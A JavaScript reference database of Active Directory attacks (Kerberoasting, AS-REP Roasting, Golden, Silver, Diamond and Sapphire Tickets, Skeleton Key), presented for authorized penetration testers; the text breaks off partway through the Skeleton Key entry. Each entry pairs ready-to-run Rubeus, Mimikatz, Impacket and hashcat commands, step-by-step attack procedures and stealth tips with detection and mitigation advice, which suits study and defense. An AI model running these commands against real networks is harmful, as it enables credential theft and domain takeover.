// Copyright (c) 2026 SpartanKing18. All rights reserved.
//
// Active Directory Attack Techniques Reference Database
// Comprehensive collection of AD attack vectors, tools, enumeration methods,
// persistence mechanisms, and privilege escalation paths.
//
// This file provides detailed technical reference material for authorized
// security professionals conducting penetration testing and red team operations.

// =============================================================================
// Section 1: AD_ATTACKS - Comprehensive Active Directory Attack Techniques
// =============================================================================

const AD_ATTACKS = [
  // -------------------------------------------------------------------------
  // Kerberos Attacks
  // -------------------------------------------------------------------------
  {
    id: "AD-001",
    name: "Kerberoasting",
    category: "credential_theft",
    description: "Kerberoasting is an attack that targets service accounts in Active Directory by requesting Kerberos TGS (Ticket Granting Service) tickets for services registered with Service Principal Names (SPNs). When a domain user requests a TGS ticket for a service, the KDC encrypts the ticket using the service account's NTLM hash. An attacker can request these tickets without any special privileges and then attempt to crack the encryption offline to recover the service account's plaintext password. The attack is particularly effective because many organizations configure service accounts with weak passwords and the RC4-HMAC encryption type (etype 23) uses the account's NTLM hash directly, making it significantly faster to crack than AES-encrypted tickets. The attack was first documented by Tim Medin at DerbyCon 2014 and has since become one of the most common initial privilege escalation techniques in Active Directory environments. Modern detection focuses on identifying anomalous TGS requests, particularly those requesting RC4 encryption when the environment supports AES.",
    prerequisites: [
      "Valid domain user credentials (any authenticated user can request TGS tickets)",
      "Network access to a domain controller on port 88 (Kerberos)",
      "Service accounts with SPNs registered in the domain",
      "Ideally, service accounts using RC4 encryption for faster cracking"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "Rubeus",
        command: "Rubeus.exe kerberoast /outfile:tgs_tickets.kirbi /format:hashcat",
        description: "Requests TGS tickets for all kerberoastable accounts and outputs them in hashcat-compatible format for offline cracking"
      },
      {
        name: "Rubeus (targeted)",
        command: "Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.kirbi /format:hashcat",
        description: "Requests a TGS ticket for a specific service account by username"
      },
      {
        name: "Rubeus (RC4 downgrade)",
        command: "Rubeus.exe kerberoast /tgtdeleg /outfile:tgs_rc4.kirbi",
        description: "Uses the TGT delegation trick to force RC4 encryption on the returned tickets, making them faster to crack"
      },
      {
        name: "Impacket GetUserSPNs",
        command: "python3 GetUserSPNs.py domain.local/user:password -dc-ip 10.0.0.1 -request -outputfile kerberoast_hashes.txt",
        description: "Enumerates SPNs and requests TGS tickets from a Linux attack host using Impacket"
      },
      {
        name: "Impacket GetUserSPNs (NTLM auth)",
        command: "python3 GetUserSPNs.py domain.local/user -hashes :NTHASH -dc-ip 10.0.0.1 -request",
        description: "Performs Kerberoasting using pass-the-hash authentication"
      },
      {
        name: "PowerView",
        command: "Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv -Path kerberoast.csv -NoTypeInformation",
        description: "Uses PowerView to enumerate SPN accounts and request their TGS tickets in hashcat format"
      },
      {
        name: "hashcat",
        command: "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
        description: "Cracks Kerberoast TGS-REP hashes (RC4) using hashcat with rules"
      },
      {
        name: "hashcat (AES)",
        command: "hashcat -m 19700 kerberoast_aes256.txt /usr/share/wordlists/rockyou.txt",
        description: "Cracks Kerberoast TGS-REP hashes encrypted with AES-256"
      }
    ],
    steps: [
      "Step 1: Enumerate service accounts with SPNs using LDAP queries. Use PowerView's Get-DomainUser -SPN or Impacket's GetUserSPNs.py to identify all user accounts (not machine accounts) that have SPNs registered. Focus on accounts with adminCount=1 or membership in privileged groups.",
      "Step 2: Identify the encryption types supported by each service account. Check the msDS-SupportedEncryptionTypes attribute. Accounts supporting only RC4 (etype 23) are the easiest targets. If AES is enforced, cracking will be significantly slower but still possible with GPU resources.",
      "Step 3: Request TGS tickets for the target service accounts. Use Rubeus kerberoast or Impacket GetUserSPNs with the -request flag. If possible, use the /tgtdeleg flag in Rubeus to force RC4 downgrade on the tickets, bypassing AES enforcement at the account level.",
      "Step 4: Extract the ticket hashes and format them for offline cracking. Rubeus can output directly in hashcat format using /format:hashcat. Impacket outputs John/hashcat format by default. Ensure the output file contains valid hash entries.",
      "Step 5: Perform offline password cracking using hashcat (mode 13100 for RC4, 19700 for AES-256, 19600 for AES-128) or John the Ripper. Use wordlists combined with rules for maximum effectiveness. The rockyou.txt wordlist with best64.rule is a common starting point.",
      "Step 6: If initial cracking attempts fail, expand the attack surface by trying larger wordlists, custom rules based on the organization's password policy, or mask attacks targeting the minimum password length. Consider using cloud GPU instances for faster cracking.",
      "Step 7: Validate cracked credentials by authenticating to the domain. Use crackmapexec or a simple net use command to verify the password works. Check the service account's group memberships and permissions to understand the access gained.",
      "Step 8: If the service account has elevated privileges (Domain Admin, local admin on servers, database access), use those permissions to move laterally or escalate further within the domain."
    ],
    detection: "Monitor for Event ID 4769 (Kerberos Service Ticket Operations) with ticket encryption type 0x17 (RC4-HMAC), especially when the requesting account normally uses AES. Look for a single account requesting TGS tickets for multiple SPNs in a short time period, which is anomalous for normal user behavior. Configure Microsoft Defender for Identity or a SIEM to alert on bulk TGS requests. Event ID 4770 (Kerberos Service Ticket Renewal) may also indicate ticket manipulation. Additionally, monitor for LDAP queries filtering on servicePrincipalName attributes, which indicates SPN enumeration (a precursor to Kerberoasting). Honeypot accounts with SPNs and strong passwords can provide early warning of Kerberoasting attempts.",
    mitigation: "Enforce long, complex passwords (25+ characters) on all service accounts with SPNs. Use Group Managed Service Accounts (gMSAs) which have automatically rotated 240-character passwords that are effectively uncrackable. Disable RC4 encryption (etype 23) domain-wide via Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > Network security: Configure encryption types allowed for Kerberos. Set to only allow AES128 and AES256. Regularly audit accounts with SPNs using Get-ADUser -Filter {ServicePrincipalName -ne '$null'} and remove unnecessary SPNs. Implement Microsoft ATA or Defender for Identity for behavioral detection.",
    references: [
      "https://attack.mitre.org/techniques/T1558/003/",
      "https://www.semperis.com/blog/kerberoasting-attack/",
      "https://adsecurity.org/?p=2293",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting"
    ]
  },
  {
    id: "AD-002",
    name: "AS-REP Roasting",
    category: "credential_theft",
    description: "AS-REP Roasting targets Active Directory accounts that have the 'Do not require Kerberos preauthentication' flag set (UF_DONT_REQUIRE_PREAUTH, UAC value 0x400000). In a normal Kerberos authentication flow, the client must prove knowledge of the user's password by encrypting a timestamp with the user's key during the AS-REQ (Authentication Service Request). When pre-authentication is disabled, the KDC will return an AS-REP containing a session key encrypted with the user's NTLM hash without verifying the requestor's identity. An attacker can request AS-REP responses for these accounts and crack them offline to recover plaintext passwords. While this misconfiguration is less common than Kerberoastable accounts, it requires even fewer privileges -- it can be performed without any domain credentials if the attacker knows the username. The pre-authentication bypass was originally designed for compatibility with certain legacy systems and smart card configurations but is frequently left enabled inadvertently.",
    prerequisites: [
      "Knowledge of usernames with DONT_REQUIRE_PREAUTH set (can be enumerated with valid domain creds)",
      "Network access to a domain controller on port 88",
      "No domain credentials required if target usernames are known (unlike Kerberoasting which requires authentication)"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "Rubeus",
        command: "Rubeus.exe asreproast /outfile:asrep_hashes.txt /format:hashcat",
        description: "Enumerates and requests AS-REP responses for all accounts with pre-auth disabled"
      },
      {
        name: "Rubeus (targeted)",
        command: "Rubeus.exe asreproast /user:targetuser /outfile:asrep.txt /format:hashcat",
        description: "Requests an AS-REP for a specific user account"
      },
      {
        name: "Impacket GetNPUsers",
        command: "python3 GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt",
        description: "Requests AS-REP responses for users listed in a file, no authentication required"
      },
      {
        name: "Impacket GetNPUsers (authenticated)",
        command: "python3 GetNPUsers.py domain.local/user:password -dc-ip 10.0.0.1 -request -format hashcat",
        description: "Authenticates to enumerate all accounts with pre-auth disabled and requests their AS-REPs"
      },
      {
        name: "hashcat",
        command: "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule",
        description: "Cracks AS-REP hashes using hashcat mode 18200"
      },
      {
        name: "PowerView",
        command: "Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, userprincipalname, useraccountcontrol",
        description: "Enumerates accounts with Kerberos pre-authentication disabled using PowerView"
      }
    ],
    steps: [
      "Step 1: Enumerate accounts with pre-authentication disabled. If you have domain credentials, use PowerView Get-DomainUser -PreauthNotRequired or an LDAP filter: (&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))). This finds enabled accounts with UF_DONT_REQUIRE_PREAUTH set.",
      "Step 2: If you do not have domain credentials, compile a list of potential usernames through OSINT, LinkedIn scraping, or username enumeration via Kerberos (kerbrute userenum). You can send AS-REQ packets without credentials to test if accounts exist and have pre-auth disabled.",
      "Step 3: Request AS-REP responses for identified accounts using Rubeus asreproast or Impacket GetNPUsers. The KDC will return an AS-REP containing encrypted data that can be cracked offline. No authentication is required for this step if you know the usernames.",
      "Step 4: Extract the encrypted part of the AS-REP (the session key encrypted with the user's key). Format the hash for offline cracking -- Rubeus and Impacket both support direct hashcat format output.",
      "Step 5: Crack the AS-REP hashes offline using hashcat mode 18200 or John the Ripper format krb5asrep. AS-REP hashes use the same encryption as Kerberoast tickets and can be cracked at similar speeds.",
      "Step 6: Validate recovered credentials and assess the compromised account's privileges. Check group memberships, AdminCount attribute, and any SPNs or delegation configurations associated with the account.",
      "Step 7: Use the compromised credentials for further enumeration and attacks. If the account has elevated privileges, proceed with lateral movement. If not, use the valid domain credentials for Kerberoasting, BloodHound enumeration, and other authenticated attacks."
    ],
    detection: "Monitor for Event ID 4768 (Kerberos Authentication Ticket Request) where pre-authentication type is 0 (no pre-auth). This is unusual and should be rare in modern environments. Alert on multiple AS-REQ requests from a single source IP targeting different accounts, especially if those requests do not include pre-authentication data. Microsoft Defender for Identity can detect AS-REP Roasting activity. Also monitor for LDAP queries filtering on UserAccountControl value 4194304, which indicates enumeration of vulnerable accounts. Implement honeypot accounts with DONT_REQUIRE_PREAUTH and strong passwords to detect reconnaissance.",
    mitigation: "Audit all accounts with pre-authentication disabled: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth. Enable pre-authentication on all accounts unless there is a documented business justification. For accounts that genuinely require this setting, enforce extremely strong passwords (25+ characters). Consider using the Protected Users group which enforces Kerberos pre-authentication regardless of the account flag. Regularly scan for this misconfiguration as part of AD security assessments.",
    references: [
      "https://attack.mitre.org/techniques/T1558/004/",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat",
      "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast"
    ]
  },
  {
    id: "AD-003",
    name: "Golden Ticket",
    category: "persistence",
    description: "A Golden Ticket attack involves forging a Kerberos Ticket Granting Ticket (TGT) using the NTLM hash of the krbtgt account. The krbtgt account is a special service account in Active Directory that is used by the Key Distribution Center (KDC) to encrypt and sign all TGTs. If an attacker obtains the krbtgt hash (typically via DCSync or NTDS.dit extraction), they can forge TGTs for any user in the domain, including non-existent users, with arbitrary group memberships and ticket lifetimes. The forged ticket is valid across all domain controllers in the domain because they all share the same krbtgt key. Golden Tickets persist even after password resets of compromised user accounts because the krbtgt hash is rarely changed. To fully invalidate a Golden Ticket, the krbtgt password must be reset twice (to flush both the current and previous keys), and even then, tickets already issued remain valid until they expire. This attack was first demonstrated by Benjamin Delpy through Mimikatz and represents one of the most powerful persistence mechanisms in Active Directory.",
    prerequisites: [
      "NTLM hash of the krbtgt account (obtained via DCSync, NTDS.dit extraction, or other credential theft)",
      "Domain SID (easily obtainable by any domain user)",
      "Domain FQDN",
      "Domain Admin or equivalent access to obtain the krbtgt hash initially"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "Mimikatz (create ticket)",
        command: "mimikatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:NTLMHASH /ptt\"",
        description: "Forges a Golden Ticket for the Administrator account and injects it into the current session"
      },
      {
        name: "Mimikatz (with groups)",
        command: "mimikatz.exe \"kerberos::golden /user:FakeAdmin /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:NTLMHASH /id:500 /groups:512,513,518,519,520 /ticket:golden.kirbi\"",
        description: "Creates a Golden Ticket with specific group RIDs (Domain Admins, Enterprise Admins, etc.) and saves to file"
      },
      {
        name: "Impacket ticketer",
        command: "python3 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain domain.local Administrator",
        description: "Creates a Golden Ticket from Linux using Impacket"
      },
      {
        name: "Rubeus",
        command: "Rubeus.exe golden /rc4:KRBTGT_HASH /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /ptt",
        description: "Forges and injects a Golden Ticket using Rubeus"
      },
      {
        name: "Mimikatz (DCSync for krbtgt)",
        command: "mimikatz.exe \"lsadump::dcsync /domain:domain.local /user:krbtgt\"",
        description: "Extracts the krbtgt hash using DCSync (prerequisite step)"
      }
    ],
    steps: [
      "Step 1: Obtain the krbtgt NTLM hash. This requires Domain Admin or equivalent privileges. Use DCSync via Mimikatz (lsadump::dcsync /domain:domain.local /user:krbtgt) or Impacket secretsdump.py. Alternatively, extract from NTDS.dit if you have a copy of the database.",
      "Step 2: Gather domain information: the domain FQDN (domain.local) and domain SID (S-1-5-21-...). The SID can be obtained with whoami /all, PowerView Get-DomainSID, or Impacket lookupsid.py.",
      "Step 3: Forge the Golden Ticket using Mimikatz kerberos::golden module. Specify the target username (can be any user including Administrator), domain, SID, krbtgt hash, and desired group memberships. Include RIDs 512 (Domain Admins), 519 (Enterprise Admins), 518 (Schema Admins) for maximum access.",
      "Step 4: Either inject the ticket directly into memory using /ptt (pass-the-ticket) or save it to a file using /ticket:golden.kirbi for later use. From Linux, set the KRB5CCNAME environment variable to point to the ccache file.",
      "Step 5: Verify the ticket works by accessing domain resources. Use klist to confirm the ticket is in memory, then try dir \\\\dc01.domain.local\\c$ or PsExec to a domain controller.",
      "Step 6: Use the Golden Ticket for persistent domain access. Since the ticket is valid until the krbtgt hash is changed (which requires two resets with replication between them), this provides long-term access to the domain.",
      "Step 7: For enhanced stealth, set realistic ticket lifetimes (10 hours rather than the default 10 years in Mimikatz), use a real username rather than a non-existent one, and include only the group memberships actually needed.",
      "Step 8: From Linux, export the ticket as KRB5CCNAME=Administrator.ccache and use it with Impacket tools like psexec.py, smbexec.py, or wmiexec.py with the -k -no-pass flags."
    ],
    detection: "Detect Golden Tickets by monitoring for TGTs with abnormal lifetimes -- default Mimikatz Golden Tickets have a 10-year lifetime. Event ID 4769 (TGS requests) may show tickets with the account name not matching any existing user. Event ID 4624 (Logon) with Logon Type 3 where the account SID does not match any known account indicates a forged ticket. Monitor for anomalous Kerberos authentication from unexpected source IPs. Microsoft Defender for Identity can detect Golden Ticket usage by correlating AS-REQ and TGS-REQ patterns. Look for TGT encryption using RC4 when the domain policy enforces AES. Also check for Event ID 4672 (Special Privilege Assigned) for unexpected admin logons.",
    mitigation: "Rotate the krbtgt password twice with adequate replication time between resets (at minimum, wait for full AD replication before the second reset). Microsoft provides a krbtgt reset script for this purpose. Implement the Protected Users security group for privileged accounts, which enforces AES encryption and shorter ticket lifetimes. Deploy Microsoft Defender for Identity for behavioral detection. Minimize the number of accounts with DCSync privileges (Replicating Directory Changes and Replicating Directory Changes All). Implement tiered administration to limit Domain Admin exposure. Consider implementing Windows Credential Guard on domain controllers.",
    references: [
      "https://attack.mitre.org/techniques/T1558/001/",
      "https://adsecurity.org/?p=1640",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets"
    ]
  },
  {
    id: "AD-004",
    name: "Silver Ticket",
    category: "persistence",
    description: "A Silver Ticket attack involves forging a Kerberos TGS (Ticket Granting Service) ticket using the NTLM hash or AES key of a service account. Unlike a Golden Ticket which forges a TGT and requires the krbtgt hash, a Silver Ticket forges a service ticket directly and only requires the target service account's hash. The forged ticket never passes through the KDC, making it stealthier than a Golden Ticket. The attacker can specify arbitrary user names and group memberships in the ticket's PAC (Privilege Attribute Certificate), granting whatever access the target service provides. Silver Tickets are limited to the specific service for which they are forged (e.g., CIFS for file shares, HTTP for web services, MSSQL for database access, HOST for administrative access). Because the ticket is presented directly to the service without KDC validation, there are no AS-REQ or TGS-REQ events logged on the domain controller, making detection significantly more difficult.",
    prerequisites: [
      "NTLM hash or AES key of the target service account (machine account for services running as SYSTEM, or user account for services running under a service account)",
      "Service Principal Name (SPN) of the target service",
      "Domain SID",
      "Knowledge of the target service type (CIFS, HTTP, MSSQL, LDAP, HOST, etc.)"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "Mimikatz (CIFS Silver Ticket)",
        command: "mimikatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:fileserver.domain.local /service:cifs /rc4:SERVICE_NTLM_HASH /ptt\"",
        description: "Forges a Silver Ticket for CIFS access (file shares) on the target server"
      },
      {
        name: "Mimikatz (HOST Silver Ticket)",
        command: "mimikatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:dc01.domain.local /service:host /rc4:DC_MACHINE_HASH /ptt\"",
        description: "Forges a Silver Ticket for HOST service (PsExec, scheduled tasks, WMI)"
      },
      {
        name: "Impacket ticketer",
        command: "python3 ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain domain.local -spn cifs/fileserver.domain.local Administrator",
        description: "Creates a Silver Ticket from Linux for CIFS access"
      },
      {
        name: "Rubeus",
        command: "Rubeus.exe silver /service:cifs/fileserver.domain.local /rc4:SERVICE_HASH /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /ptt",
        description: "Forges a Silver Ticket using Rubeus and injects into the current session"
      }
    ],
    steps: [
      "Step 1: Obtain the target service account's NTLM hash. For services running as SYSTEM (most Windows services), this is the computer account hash. Extract via Mimikatz sekurlsa::logonpasswords on the target machine, or via DCSync if you have Domain Admin access.",
      "Step 2: Identify the target service SPN. Common service types: CIFS (file shares, SMB), HTTP (web apps, WinRM), MSSQL (SQL Server), LDAP (Active Directory queries), HOST (administrative access, PsExec), WSMAN (PowerShell Remoting).",
      "Step 3: Gather the domain SID using whoami /all or PowerView Get-DomainSID. Note the SID format: S-1-5-21-XXXXX-XXXXX-XXXXX (without the trailing RID).",
      "Step 4: Forge the Silver Ticket using Mimikatz kerberos::golden with the /service and /target flags. Despite the command name, specifying /service makes it create a Silver Ticket instead of a Golden Ticket. Include relevant group RIDs in the PAC.",
      "Step 5: Inject the ticket into memory with /ptt or save to a file. On Linux, set KRB5CCNAME to the output .ccache file for use with Impacket tools.",
      "Step 6: Access the target service using the forged ticket. For CIFS: dir \\\\target\\c$. For MSSQL: connect via sqlcmd with trusted connection. For HOST: PsExec or schtasks. For HTTP: WinRM/PowerShell Remoting.",
      "Step 7: To maximize access, create Silver Tickets for multiple services on the same target (CIFS + HOST + HTTP) to enable different access methods.",
      "Step 8: For persistence, save the Silver Ticket files for reuse. They remain valid until the service account's password is changed."
    ],
    detection: "Silver Tickets are harder to detect than Golden Tickets because no TGS-REQ is sent to the KDC. Monitor for Event ID 4624 (Logon) and Event ID 4634 (Logoff) on target servers where the account SID in the ticket does not match any known domain account. Enable PAC validation on services (which causes the service to verify the PAC with the KDC) -- this defeats Silver Tickets but has performance implications. Monitor for anomalous service access patterns and logins from unexpected sources. Event ID 4627 (Group Membership Information) can reveal tickets with suspicious group memberships. Windows event log on the target server showing service ticket use without corresponding KDC logs is a strong indicator.",
    mitigation: "Enable PAC validation where feasible to force services to verify tickets with the KDC. Regularly rotate service account passwords and computer account passwords. Use Group Managed Service Accounts (gMSAs) with automatic password rotation. Implement network segmentation to limit which systems can directly access services. Deploy endpoint detection solutions that can identify suspicious Kerberos ticket usage. Monitor service account hash exposure through regular credential hygiene assessments.",
    references: [
      "https://attack.mitre.org/techniques/T1558/002/",
      "https://adsecurity.org/?p=2011",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets"
    ]
  },
  {
    id: "AD-005",
    name: "Diamond Ticket",
    category: "persistence",
    description: "A Diamond Ticket is a refined evolution of the Golden Ticket attack that involves requesting a legitimate TGT from the KDC and then decrypting it using the krbtgt hash, modifying its contents (such as the PAC, group memberships, and ticket flags), and re-encrypting it. Unlike a Golden Ticket which is entirely forged and may have detectable anomalies (such as missing AS-REQ events or inconsistent metadata), a Diamond Ticket starts from a legitimate ticket and thus retains all the normal ticket metadata and KDC interaction artifacts. The technique was documented by Charlie Clark and Andrew Schwartz, building on earlier research into Kerberos ticket manipulation. The key advantage is that the resulting ticket has a corresponding AS-REQ event on the domain controller, making it significantly harder to detect through log correlation. The attack still requires the krbtgt hash, making it equivalent in prerequisites to a Golden Ticket, but it provides superior operational security for sophisticated threat actors.",
    prerequisites: [
      "NTLM hash or AES key of the krbtgt account",
      "Valid domain user credentials to request the initial legitimate TGT",
      "Domain SID and FQDN",
      "Network access to a domain controller"
    ],
    difficulty: "expert",
    tools: [
      {
        name: "Rubeus",
        command: "Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:lowprivuser /password:Password123 /enctype:aes256 /domain:domain.local /dc:dc01.domain.local /ticketuser:Administrator /ticketuserid:500 /groups:512,519 /ptt",
        description: "Requests a legitimate TGT, decrypts it with the krbtgt key, modifies the PAC to impersonate Administrator, and injects the modified ticket"
      },
      {
        name: "Rubeus (with NTLM hash)",
        command: "Rubeus.exe diamond /tgtdeleg /krbkey:AES256_KRBTGT_KEY /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt",
        description: "Uses TGT delegation to obtain the initial ticket, then modifies it to impersonate Administrator"
      },
      {
        name: "Mimikatz",
        command: "mimikatz.exe \"kerberos::golden /user:lowprivuser /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT_HASH /startoffset:0 /endin:600 /renewmax:10080 /ptt\"",
        description: "While Mimikatz creates a traditional Golden Ticket, the Diamond Ticket workflow involves modifying a legitimate ticket which Rubeus handles natively"
      }
    ],
    steps: [
      "Step 1: Obtain the krbtgt AES256 key (preferred over NTLM hash for Diamond Tickets). Use DCSync: mimikatz.exe lsadump::dcsync /domain:domain.local /user:krbtgt to extract both the NTLM hash and AES keys.",
      "Step 2: Choose a legitimate domain user account to request the initial TGT. This creates a real AS-REQ/AS-REP exchange that will appear in KDC logs, providing cover for the ticket's existence.",
      "Step 3: Request a legitimate TGT using Rubeus with the diamond command. Rubeus will authenticate as the specified user, receive a valid TGT, decrypt it using the krbtgt key, modify the PAC to contain the target user's identity and group memberships, and re-encrypt the ticket.",
      "Step 4: Specify the target identity using /ticketuser and /ticketuserid. Set /ticketuser:Administrator /ticketuserid:500 to impersonate the built-in Administrator. Add group RIDs with /groups:512,519 for Domain Admins and Enterprise Admins.",
      "Step 5: Inject the modified ticket into the current session with /ptt. The ticket now functions as a TGT for the impersonated user but has a corresponding AS-REQ event from the legitimate user's authentication.",
      "Step 6: Use the Diamond Ticket for domain operations. Because it is a modified legitimate TGT, it includes proper ticket metadata, realistic timestamps, and correct encryption types, making it very difficult to distinguish from a normal TGT.",
      "Step 7: For maximum stealth, ensure the initial user's authentication patterns are realistic -- authenticate from their usual workstation IP, during normal business hours, and with expected encryption types."
    ],
    detection: "Diamond Tickets are significantly harder to detect than Golden Tickets because they have corresponding AS-REQ events and realistic ticket metadata. Detection requires comparing the TGT's PAC contents with the actual user's attributes in Active Directory. If the PAC claims Domain Admin membership but the account is a regular user, this is a Diamond Ticket. Enable Kerberos armoring (FAST) which adds additional authentication layers. Advanced detection involves monitoring for discrepancies between the authenticating account and the account name in subsequent TGS-REQ PAC data. Microsoft Defender for Identity can detect some Diamond Ticket variants by correlating authentication events.",
    mitigation: "The same mitigations as Golden Ticket apply: rotate krbtgt password twice, implement the Protected Users group, and deploy advanced Kerberos monitoring. Additionally, enable Kerberos armoring (FAST/Compound Authentication) via Group Policy which adds an additional layer of authentication that cannot be bypassed with a modified ticket. Implement claims-based access control and Dynamic Access Control (DAC) to add additional authorization checks beyond PAC group memberships. Use AES encryption exclusively and disable RC4 to make ticket manipulation more computationally expensive.",
    references: [
      "https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/",
      "https://www.trustedsec.com/blog/a-diamond-in-the-ruff/",
      "https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/"
    ]
  },
  {
    id: "AD-006",
    name: "Sapphire Ticket",
    category: "persistence",
    description: "A Sapphire Ticket is the most advanced form of Kerberos ticket forgery, combining elements of Diamond Tickets with the S4U2Self+U2U (User-to-User) Kerberos extension to obtain a legitimate PAC for another user. Instead of forging or modifying the PAC contents, the attacker uses S4U2Self to ask the KDC to create a legitimate PAC for the target user (e.g., Domain Admin), then takes that legitimate PAC and inserts it into a modified TGT. Because the PAC is genuinely created by the KDC with accurate group memberships, timestamps, and signatures, it passes all PAC validation checks. This makes Sapphire Tickets virtually undetectable through PAC inspection, unlike Golden or Diamond Tickets where the PAC is forged or modified. The technique leverages the User-to-User (U2U) authentication mechanism, which was designed for scenarios where the service does not have a long-term key, and the S4U2Self extension, which allows a service to obtain a ticket to itself on behalf of another user.",
    prerequisites: [
      "NTLM hash or AES key of the krbtgt account",
      "A compromised account with an SPN (or the ability to set one) for S4U2Self",
      "Domain SID and FQDN",
      "Network access to a domain controller"
    ],
    difficulty: "expert",
    tools: [
      {
        name: "Impacket ticketer",
        command: "python3 ticketer.py -request -impersonate Administrator -domain domain.local -user lowprivuser -password Password123 -nthash KRBTGT_HASH -domain-sid S-1-5-21-DOMAIN-SID -aesKey AES256_KRBTGT_KEY",
        description: "Creates a Sapphire Ticket by requesting a legitimate PAC via S4U2Self+U2U and incorporating it into a forged TGT"
      },
      {
        name: "Rubeus",
        command: "Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /ticketuser:Administrator /ticketuserid:500 /tgtdeleg /ptt",
        description: "Rubeus diamond mode can function similarly to a Sapphire Ticket when combined with PAC harvesting"
      }
    ],
    steps: [
      "Step 1: Obtain the krbtgt AES256 key via DCSync or NTDS.dit extraction. The AES key is preferred for Sapphire Tickets as it produces tickets with proper AES encryption.",
      "Step 2: Identify or create a service account that can perform S4U2Self. If you control a machine account or any account with an SPN, it can request service tickets to itself on behalf of other users.",
      "Step 3: Use the S4U2Self+U2U protocol flow to request a service ticket on behalf of the target user (e.g., Administrator). The U2U extension allows this to work even without a traditional service key by using the TGT session key instead.",
      "Step 4: The KDC generates a legitimate PAC for the target user with accurate group memberships, SID history, and other attributes. This PAC is cryptographically valid because the KDC itself generated it.",
      "Step 5: Extract the PAC from the S4U2Self service ticket and incorporate it into a new TGT. Encrypt the ticket using the krbtgt key. The resulting ticket has a KDC-generated PAC but functions as a TGT.",
      "Step 6: Inject the Sapphire Ticket into the current session and use it for authentication. Because the PAC is legitimate, any PAC validation checks will pass, making this ticket virtually undetectable through standard means.",
      "Step 7: The Sapphire Ticket provides the same level of access as a Golden Ticket but with significantly better operational security due to the legitimate PAC."
    ],
    detection: "Sapphire Tickets are extremely difficult to detect because the PAC is legitimately generated by the KDC. Traditional PAC validation will not catch these tickets. Detection approaches include monitoring for unusual S4U2Self requests (Event ID 4769 with specific flags), correlating authentication patterns (a user authenticating from an unexpected source after S4U2Self was used for their identity), and implementing Kerberos armoring (FAST) which adds compound authentication that binds the ticket to the authenticating device. Advanced behavioral analysis comparing normal authentication baselines against post-exploitation patterns is the most reliable detection method.",
    mitigation: "Implement Kerberos armoring (FAST/Compound Authentication) to bind tickets to device identity. Restrict which accounts can perform S4U2Self operations by limiting SPN registration. Deploy advanced threat detection solutions capable of behavioral analysis beyond simple log correlation. Rotate the krbtgt password twice regularly. Use the Protected Users group for all privileged accounts. Implement strict monitoring on S4U2Self and U2U protocol usage patterns.",
    references: [
      "https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/",
      "https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire"
    ]
  },
  {
    id: "AD-007",
    name: "Skeleton Key",
    category: "persistence",
    description: "The Skeleton Key attack involves patching the LSASS (Local Security Authority Subsystem Service) process on a domain controller to inject a master password that works alongside every user's real password. After the patch is applied, any user account can authenticate with either their real password or the skeleton key password (default: mimikatz). The attack works by hooking the authentication functions within LSASS to accept an additional credential. The patch is applied in-memory and does not survive a reboot, but while active, it provides the attacker with universal authentication capability across the entire domain. The technique was first documented in the Mimikatz misc::skeleton module. Because LSASS is a critical system process, patching it carries risk of system instability, and Credential Guard prevents the attack entirely by isolating LSASS in a virtualization-based security environment. For persistence across reboots, the attack must be reapplied or combined with other persistence mechanisms.",
    prerequisites: [
      "Domain Admin or SYSTEM access on a domain controller",
      "Ability to execute code in the context of LSASS (typically requires debug privileges)",
      "LSASS must not be running as a Protected Process Light (PPL)",
      "Windows Credential Guard must not be enabled"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "Mimikatz",
        command: "mimikatz.exe \"privilege::debug\" \"misc::skeleton\"",
        description: "Patches LSASS on the current domain controller to accept the skeleton key password 'mimikatz' for all accounts"
      },
      {
        name: "Mimikatz (remote)",
        command: "Invoke-Mimikatz -Command '\"misc::skeleton\"' -ComputerName dc01.domain.local",
        description: "Remotely patches LSASS on a domain controller using PowerShell remoting"
      },
      {
        name: "Authentication test",
